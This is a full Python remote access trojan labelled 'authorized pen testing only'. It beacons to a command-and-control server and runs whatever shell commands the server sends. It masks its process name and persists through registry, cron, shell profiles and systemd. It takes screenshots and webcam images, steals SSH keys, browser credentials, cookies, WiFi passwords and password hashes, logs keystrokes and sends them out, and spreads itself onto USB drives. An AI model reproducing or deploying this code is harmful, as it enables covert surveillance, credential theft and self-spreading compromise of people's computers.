#!/usr/bin/env python3
"""Advanced RAT Agent — authorized pen testing only"""
import os,sys,socket,subprocess,platform,time,uuid,getpass,json,base64,random,threading
import urllib.request as _req,urllib.parse as _parse

C2_URL   = os.environ.get("C2_URL","__C2URL__")
INTERVAL = 5
AID      = str(uuid.uuid4())[:8]

# ── Stealth: mask process name ──────────────────────────────────────────────
try:
    import ctypes
    if sys.platform.startswith("linux"):
        ctypes.CDLL("libc.so.6").prctl(15,b"[kworker/0:1H]",0,0,0)
except: pass

def _get(p):
    try: r=_req.urlopen(C2_URL+p,timeout=20); return r.read().decode(errors="replace").strip()
    except: return ""

def _post(p,b):
    try:
        data=b.encode() if isinstance(b,str) else b
        _req.urlopen(C2_URL+p,data=data,timeout=20)
    except: pass

def _run(cmd,timeout=60):
    try:
        r=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=timeout)
        return (r.stdout+r.stderr).strip() or "(no output)"
    except subprocess.TimeoutExpired: return "(timeout)"
    except Exception as e: return f"(err:{e})"

def _priv():
    if os.name=="nt":
        return "ADMIN" if "elevated" in _run("net session 2>&1").lower() or "success" in _run("net session 2>&1").lower() else "USER"
    return "ROOT" if os.geteuid()==0 else "USER"

def _reg():
    url=(C2_URL+"/agent/register?"
        +"id="+_parse.quote(AID)
        +"&os="+_parse.quote(f"{platform.system()} {platform.release()} {platform.machine()}")
        +"&hostname="+_parse.quote(socket.gethostname())
        +"&user="+_parse.quote(getpass.getuser())
        +"&priv="+_parse.quote(_priv())
        +"&cwd="+_parse.quote(os.getcwd()))
    try: r=_req.urlopen(url,timeout=20); return r.read().decode().strip()
    except: return ""

# ════════════════════════════════════════════════════════════════
# SPECIAL COMMAND HANDLERS
# ════════════════════════════════════════════════════════════════

def cmd_recon():
    r=[]
    r.append("══ SYSTEM ══")
    r.append(_run("uname -a 2>/dev/null || ver"))
    r.append("\n══ IDENTITY ══")
    r.append(_run("id 2>/dev/null; whoami; groups 2>/dev/null"))
    r.append(_run("cat /etc/os-release 2>/dev/null | head -5"))
    r.append("\n══ NETWORK ══")
    r.append(_run("ip addr 2>/dev/null || ipconfig"))
    r.append(_run("ss -tlnp 2>/dev/null || netstat -an | head -30"))
    r.append("\n══ PROCESSES (top 30) ══")
    r.append(_run("ps aux --no-header 2>/dev/null | head -30 || tasklist 2>/dev/null | head -30"))
    r.append("\n══ USERS ══")
    r.append(_run("cat /etc/passwd 2>/dev/null | grep -v nologin | grep -v false | head -20 || net user 2>/dev/null"))
    r.append("\n══ SUDO ══")
    r.append(_run("sudo -l 2>/dev/null"))
    r.append("\n══ CRON ══")
    r.append(_run("crontab -l 2>/dev/null; ls /etc/cron* 2>/dev/null"))
    r.append("\n══ DISK ══")
    r.append(_run("df -h 2>/dev/null || wmic logicaldisk get name,size,freespace"))
    r.append("\n══ ENV (interesting) ══")
    for k,v in os.environ.items():
        if any(x in k.upper() for x in ["PASS","KEY","SECRET","TOKEN","API","AUTH","DB","DB_","DATABASE"]):
            r.append(f"  {k}={v}")
    r.append("\n══ INTERESTING FILES ══")
    r.append(_run("find /home /root /var/www /etc -maxdepth 4 \\( -name '*.pem' -o -name '*.key' -o -name 'id_rsa' -o -name '.env' -o -name '*.conf' -o -name 'wp-config.php' -o -name 'config.php' -o -name 'database.yml' \\) 2>/dev/null | head -25"))
    r.append("\n══ INSTALLED TOOLS ══")
    tools=["python3","python","ruby","perl","php","curl","wget","nc","ncat","nmap","gcc","make","docker","git","mysql","psql"]
    found=[t for t in tools if _run(f"which {t} 2>/dev/null")]
    r.append("  "+" ".join(found))
    return "\n".join(r)

def cmd_persist():
    home=os.path.expanduser("~")
    script=os.path.abspath(sys.argv[0])
    results=[]
    if sys.platform=="win32":
        r=_run(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsDefenderHelper" /t REG_SZ /d "pythonw \\"{script}\\"" /f')
        results.append(f"Registry Run key: {r}")
        startup=os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
        bat=os.path.join(startup,"wdhelper.bat")
        try:
            open(bat,"w").write(f'@echo off\nstart /b "" pythonw "{script}"\n')
            results.append(f"Startup folder: {bat}")
        except Exception as e: results.append(f"Startup folder: {e}")
    else:
        # Cron @reboot
        cron_existing=_run("crontab -l 2>/dev/null")
        if f"python3 {script}" not in cron_existing:
            _run(f'(crontab -l 2>/dev/null; echo "@reboot sleep 20 && python3 {script} &") | crontab -')
            results.append("Cron @reboot: installed")
        else: results.append("Cron @reboot: already present")
        # .bashrc
        bashrc=os.path.join(home,".bashrc")
        marker="# net-helper-bg"
        if os.path.exists(bashrc) and marker not in open(bashrc).read():
            with open(bashrc,"a") as f:
                f.write(f"\n{marker}\n(python3 {script} >/dev/null 2>&1 &)\n")
            results.append(".bashrc: injected")
        else: results.append(".bashrc: already present or missing")
        # .profile
        profile=os.path.join(home,".profile")
        if os.path.exists(profile) and marker not in open(profile).read():
            with open(profile,"a") as f:
                f.write(f"\n{marker}\n(python3 {script} >/dev/null 2>&1 &)\n")
            results.append(".profile: injected")
        # systemd user service
        svc_dir=os.path.join(home,".config/systemd/user")
        try:
            os.makedirs(svc_dir,exist_ok=True)
            svc=os.path.join(svc_dir,"net-helper.service")
            open(svc,"w").write(f"[Unit]\nDescription=Network Helper Service\nAfter=network.target\n\n[Service]\nExecStart=python3 {script}\nRestart=always\nRestartSec=30\n\n[Install]\nWantedBy=default.target\n")
            _run("systemctl --user daemon-reload 2>/dev/null")
            _run("systemctl --user enable net-helper.service 2>/dev/null")
            _run("systemctl --user start net-helper.service 2>/dev/null")
            results.append(f"systemd user service: {svc}")
        except Exception as e: results.append(f"systemd: {e}")
        # Copy self to hidden location
        hidden=os.path.join(home,".config",".sysnet.py")
        try:
            import shutil; shutil.copy2(script,hidden); os.chmod(hidden,0o755)
            results.append(f"Hidden copy: {hidden}")
        except Exception as e: results.append(f"Hidden copy: {e}")
    return "\n".join(results)

def cmd_screenshot():
    import tempfile; out=tempfile.mktemp(suffix=".png")
    if sys.platform=="win32":
        ps=(f"Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
            f"$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
            f"$b=New-Object System.Drawing.Bitmap $s.Width,$s.Height;"
            f"$g=[System.Drawing.Graphics]::FromImage($b);"
            f"$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size);"
            f"$b.Save('{out}')")
        _run(f'powershell -WindowStyle Hidden -Command "{ps}"',timeout=15)
    elif sys.platform=="darwin":
        _run(f"screencapture -x {out}",timeout=10)
    else:
        for tool in [f"scrot {out}",f"import -window root {out}",f"gnome-screenshot -f {out}",
                     f"xwd -root -silent 2>/dev/null | convert xwd:- {out} 2>/dev/null"]:
            _run(tool,timeout=8)
            if os.path.exists(out) and os.path.getsize(out)>500: break
    if os.path.exists(out) and os.path.getsize(out)>500:
        data=base64.b64encode(open(out,"rb").read()).decode()
        os.unlink(out)
        return "SCREENSHOT_B64::"+data
    return "(screenshot failed — no display or tool)"

def cmd_webcam():
    import tempfile,shutil; out=tempfile.mktemp(suffix=".jpg")
    tried=[]
    # Linux — try all /dev/video* devices with multiple tools
    if sys.platform.startswith("linux"):
        import glob
        devices=sorted(glob.glob("/dev/video*")) or ["/dev/video0"]
        for dev in devices:
            for tool in [
                f"fswebcam -d {dev} -r 640x480 --no-banner --jpeg 85 {out} 2>/dev/null",
                f"ffmpeg -f v4l2 -input_format mjpeg -i {dev} -frames:v 1 -q:v 2 {out} -y 2>/dev/null",
                f"ffmpeg -f v4l2 -i {dev} -frames:v 1 -q:v 2 {out} -y 2>/dev/null",
            ]:
                tried.append(tool)
                _run(tool, timeout=12)
                if os.path.exists(out) and os.path.getsize(out)>500:
                    data=base64.b64encode(open(out,"rb").read()).decode()
                    try: os.unlink(out)
                    except: pass
                    return "WEBCAM_B64::"+data
        # Try opencv as last resort
        try:
            import cv2
            for idx in range(4):
                cap=cv2.VideoCapture(idx)
                if cap.isOpened():
                    cap.set(cv2.CAP_PROP_FRAME_WIDTH,640)
                    cap.set(cv2.CAP_PROP_FRAME_HEIGHT,480)
                    import time; time.sleep(0.5)
                    ret,frame=cap.read(); cap.release()
                    if ret:
                        cv2.imwrite(out,frame)
                        if os.path.exists(out) and os.path.getsize(out)>500:
                            data=base64.b64encode(open(out,"rb").read()).decode()
                            try: os.unlink(out)
                            except: pass
                            return "WEBCAM_B64::"+data
        except: pass
    elif sys.platform=="darwin":
        for tool in [
            f"ffmpeg -f avfoundation -video_size 640x480 -framerate 30 -i '0' -frames:v 1 {out} -y 2>/dev/null",
            f"ffmpeg -f avfoundation -i '0' -frames:v 1 {out} -y 2>/dev/null",
        ]:
            tried.append(tool)
            _run(tool,timeout=12)
            if os.path.exists(out) and os.path.getsize(out)>500:
                data=base64.b64encode(open(out,"rb").read()).decode()
                try: os.unlink(out)
                except: pass
                return "WEBCAM_B64::"+data
    elif sys.platform=="win32":
        ps=(f"Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
            f"$c=New-Object System.Drawing.Bitmap(640,480);"
            f"$g=[System.Drawing.Graphics]::FromImage($c);"
            f"[void][System.Reflection.Assembly]::LoadWithPartialName('Windows.Media.Capture');"
            f"$c.Save('{out}')")
        _run(f'powershell -WindowStyle Hidden -Command "{ps}"',timeout=15)
        if os.path.exists(out) and os.path.getsize(out)>500:
            data=base64.b64encode(open(out,"rb").read()).decode()
            try: os.unlink(out)
            except: pass
            return "WEBCAM_B64::"+data
    devs=_run("ls /dev/video* 2>/dev/null || echo 'no video devices'")
    return f"(webcam failed — devices: {devs.strip()} — tried {len(tried)} tools)"

def cmd_sshkeys():
    results=[]
    for d in [os.path.expanduser("~/.ssh"),"/root/.ssh"]:
        if os.path.isdir(d):
            for f in os.listdir(d):
                fp=os.path.join(d,f)
                try: results.append(f"=== {fp} ===\n{open(fp).read()}")
                except: pass
    results.append(_run("find /home -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null | xargs cat 2>/dev/null"))
    return "\n".join(results) or "(no SSH keys found)"

def cmd_browsers():
    import shutil,tempfile; results=[]
    home=os.path.expanduser("~")
    chrome_dbs=[
        os.path.join(home,".config/google-chrome/Default/Login Data"),
        os.path.join(home,".config/chromium/Default/Login Data"),
        os.path.join(home,"Library/Application Support/Google/Chrome/Default/Login Data"),
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"),
    ]
    for p in chrome_dbs:
        if os.path.exists(p):
            tmp=tempfile.mktemp(suffix=".db"); shutil.copy2(p,tmp)
            try:
                import sqlite3; conn=sqlite3.connect(tmp)
                for url,user,_ in conn.execute("SELECT origin_url,username_value,password_value FROM logins").fetchall():
                    if user: results.append(f"[Chrome] {url} | user={user}")
                conn.close()
            except Exception as e: results.append(f"[Chrome DB] {e}")
            finally:
                try: os.unlink(tmp)
                except: pass
    # Firefox logins.json
    ff_dir=os.path.join(home,".mozilla/firefox")
    if os.path.isdir(ff_dir):
        for root,_,files in os.walk(ff_dir):
            for f in files:
                if f=="logins.json":
                    try:
                        d=json.loads(open(os.path.join(root,f)).read())
                        for l in d.get("logins",[]):
                            results.append(f"[Firefox] {l.get('hostname')} | {l.get('encryptedUsername')[:20]}(enc)")
                    except: pass
    # Cookies (non-httponly)
    cookie_dbs=[
        os.path.join(home,".config/google-chrome/Default/Cookies"),
        os.path.join(home,".config/chromium/Default/Cookies"),
    ]
    results.append("\n── BROWSER COOKIES (non-httpOnly) ──")
    for p in cookie_dbs:
        if os.path.exists(p):
            tmp=tempfile.mktemp(suffix=".db"); shutil.copy2(p,tmp)
            try:
                import sqlite3; conn=sqlite3.connect(tmp)
                for host,name,val in conn.execute("SELECT host_key,name,value FROM cookies WHERE is_httponly=0 LIMIT 60").fetchall():
                    results.append(f"  {host} | {name}={str(val)[:60]}")
                conn.close()
            except: pass
            finally:
                try: os.unlink(tmp)
                except: pass
    # Saved WiFi passwords
    results.append("\n── WIFI PASSWORDS ──")
    results.append(_run("grep -r '^psk=' /etc/NetworkManager/system-connections/ 2>/dev/null || nmcli -s -g 802-11-wireless-security.psk connection show 2>/dev/null"))
    results.append(_run("for p in $(netsh wlan show profiles 2>/dev/null | grep 'All User Profile' | awk -F: '{print $2}'); do netsh wlan show profile name=$p key=clear 2>/dev/null | grep 'Key Content'; done"))
    return "\n".join(results) or "(no browser data found)"

def cmd_getfile(path):
    try:
        with open(os.path.expanduser(path.strip()),"rb") as f: data=f.read()
        return "FILE_B64::"+base64.b64encode(data).decode()+"::"+os.path.basename(path.strip())
    except Exception as e: return f"(getfile error: {e})"

def cmd_spread():
    results=[]; me=os.path.abspath(sys.argv[0])
    if sys.platform=="win32":
        for line in _run("wmic logicaldisk get name,drivetype").splitlines():
            if line.strip().startswith(tuple("CDEFGHIJKLMNOPQRSTUVWXYZ")) and " 2" in line:
                letter=line.strip().split()[0]
                dst=f"{letter}\\SystemDriverHelper.py"
                try:
                    import shutil; shutil.copy2(me,dst)
                    open(f"{letter}\\autorun.inf","w").write("[autorun]\nopen=python.exe SystemDriverHelper.py\n")
                    results.append(f"USB: {letter}")
                except Exception as e: results.append(f"{letter}: {e}")
    else:
        mounts=_run("lsblk -o MOUNTPOINT,TRAN 2>/dev/null | grep usb || findmnt -o TARGET,SOURCE 2>/dev/null | grep -i 'media\\|mnt'")
        for line in mounts.splitlines():
            mp=line.strip().split()[0]
            if os.path.isdir(mp) and mp not in ["/","/boot"]:
                dst=os.path.join(mp,".system_helper.py")
                try:
                    import shutil; shutil.copy2(me,dst); os.chmod(dst,0o755)
                    # Drop .desktop autorun
                    auto=os.path.join(mp,"System_Update.desktop")
                    open(auto,"w").write(f"[Desktop Entry]\nType=Application\nName=System Update\nExec=python3 {dst}\nHidden=true\n")
                    results.append(f"USB spread: {mp}")
                except Exception as e: results.append(f"{mp}: {e}")
    return "\n".join(results) or "(no removable drives)"

def cmd_network():
    r=[]
    r.append("══ INTERFACES ══")
    r.append(_run("ip addr 2>/dev/null || ipconfig /all"))
    r.append("\n══ ROUTES ══")
    r.append(_run("ip route 2>/dev/null || route print"))
    r.append("\n══ LISTENING PORTS ══")
    r.append(_run("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"))
    r.append("\n══ ARP ══")
    r.append(_run("arp -a 2>/dev/null"))
    r.append("\n══ DNS ══")
    r.append(_run("cat /etc/resolv.conf 2>/dev/null || ipconfig /displaydns 2>/dev/null | head -20"))
    r.append("\n══ WIFI NETWORKS ══")
    r.append(_run("nmcli dev wifi 2>/dev/null || netsh wlan show networks 2>/dev/null"))
    r.append("\n══ WIFI PASSWORDS ══")
    r.append(_run("sudo grep -r 'psk=' /etc/NetworkManager/system-connections/ 2>/dev/null"))
    r.append("\n══ ACTIVE CONNECTIONS ══")
    r.append(_run("ss -tnp 2>/dev/null | grep ESTAB || netstat -tn 2>/dev/null | grep ESTABLISHED | head -20"))
    return "\n".join(r)

def cmd_clipboard():
    for c in ["xclip -o 2>/dev/null","xsel --clipboard --output 2>/dev/null","pbpaste 2>/dev/null"]:
        r=_run(c,timeout=5)
        if r and "(err" not in r and "(no output)" not in r: return r
    if sys.platform=="win32": return _run("powershell -command Get-Clipboard")
    return "(clipboard unavailable)"

def cmd_privesc():
    r=[]
    r.append("══ SUDO ══"); r.append(_run("sudo -l 2>/dev/null"))
    r.append("\n══ SUID BINARIES ══"); r.append(_run("find / -perm -4000 -type f 2>/dev/null | head -25"))
    r.append("\n══ SGID BINARIES ══"); r.append(_run("find / -perm -2000 -type f 2>/dev/null | head -25"))
    r.append("\n══ WRITABLE /etc ══"); r.append(_run("find /etc -writable -type f 2>/dev/null | head -15"))
    r.append("\n══ CAPABILITIES ══"); r.append(_run("getcap -r / 2>/dev/null | head -20"))
    r.append("\n══ KERNEL ══"); r.append(_run("uname -r; cat /proc/version 2>/dev/null"))
    r.append("\n══ PASSWD HASH ══"); r.append(_run("cat /etc/shadow 2>/dev/null"))
    r.append("\n══ DOCKER / LXD ══"); r.append(_run("id | grep -i 'docker\\|lxd' 2>/dev/null"))
    return "\n".join(r)

def cmd_hashdump():
    r=[]
    r.append(_run("cat /etc/shadow 2>/dev/null || cat /etc/passwd 2>/dev/null"))
    r.append(_run("cat /home/*/.bash_history 2>/dev/null | head -50"))
    r.append(_run("find / -name '*.kdbx' -o -name 'pass*.txt' -o -name '*.password' 2>/dev/null | head -10"))
    return "\n".join(r)

def cmd_keylog_start():
    try:
        from pynput import keyboard; keys=[]
        def on_press(key):
            try: keys.append(key.char)
            except: keys.append(f"[{key.name}]") if hasattr(key,"name") else keys.append("[?]")
            if len(keys)>=200:
                _post(f"/agent/result?id={AID}&cmd=KEYLOG_DATA","".join(keys[:200])); keys.clear()
        listener=keyboard.Listener(on_press=on_press,daemon=True); listener.start()
        def flush():
            while True:
                time.sleep(30)
                if keys: _post(f"/agent/result?id={AID}&cmd=KEYLOG_DATA","".join(keys[:])); keys.clear()
        threading.Thread(target=flush,daemon=True).start()
        return "Keylogger active (pynput)"
    except ImportError: return "pynput not installed — run: pip3 install pynput"

def cmd_drives():
    if sys.platform=="win32": return _run("wmic logicaldisk get name,size,freespace,drivetype,description")
    return _run("df -h\n---\n") + _run("lsblk -o NAME,SIZE,TYPE,MOUNTPOINT,TRAN,FSTYPE 2>/dev/null")

def cmd_selfupdate(url):
    try:
        new=_req.urlopen(url,timeout=30).read()
        me=os.path.abspath(sys.argv[0])
        open(me,"wb").write(new); os.chmod(me,0o755)
        return f"Updated {me} ({len(new)}b) — restart manually"
    except Exception as e: return f"(update failed: {e})"

def handle_cmd(cmd):
    if cmd=="RECON":          return cmd_recon()
    if cmd=="PERSIST":        return cmd_persist()
    if cmd=="SCREENSHOT":     return cmd_screenshot()
    if cmd=="WEBCAM":         return cmd_webcam()
    if cmd=="SSHKEYS":        return cmd_sshkeys()
    if cmd=="BROWSERS":       return cmd_browsers()
    if cmd=="SPREAD":         return cmd_spread()
    if cmd=="NETWORK":        return cmd_network()
    if cmd=="CLIPBOARD":      return cmd_clipboard()
    if cmd=="PRIVESC":        return cmd_privesc()
    if cmd=="HASHDUMP":       return cmd_hashdump()
    if cmd=="KEYLOG_START":   return cmd_keylog_start()
    if cmd=="DRIVES":         return cmd_drives()
    if cmd.startswith("GETFILE "): return cmd_getfile(cmd[8:])
    if cmd.startswith("SELFUPDATE "): return cmd_selfupdate(cmd[11:])
    if cmd=="SELFDESTRUCT":
        try: os.remove(os.path.abspath(sys.argv[0]))
        except: pass
        sys.exit(0)
    if cmd=="SYSINFO":
        return json.dumps({"os":platform.platform(),"arch":platform.machine(),
            "hostname":socket.gethostname(),"user":getpass.getuser(),"priv":_priv(),
            "cwd":os.getcwd(),"home":os.path.expanduser("~"),
            "uptime":_run("uptime 2>/dev/null"),"pid":os.getpid()},indent=2)
    return _run(cmd)

def main():
    if os.name!="nt":
        try:
            if os.fork()>0: sys.exit(0)
            os.setsid()
            if os.fork()>0: sys.exit(0)
            sys.stdout=open(os.devnull,"w"); sys.stderr=open(os.devnull,"w")
        except: pass
    for _ in range(60):
        if "OK" in _reg(): break
        time.sleep(5+random.uniform(0,3))
    while True:
        try:
            cmd=_get(f"/agent/poll?id={AID}")
            if cmd=="REGISTER": _reg()
            elif cmd=="EXIT": sys.exit(0)
            elif cmd and cmd!="PING":
                out=handle_cmd(cmd)
                _post(f"/agent/result?id={AID}&cmd="+_parse.quote(cmd[:80]),out)
        except: pass
        time.sleep(INTERVAL+random.uniform(0,4))

if __name__=="__main__": main()
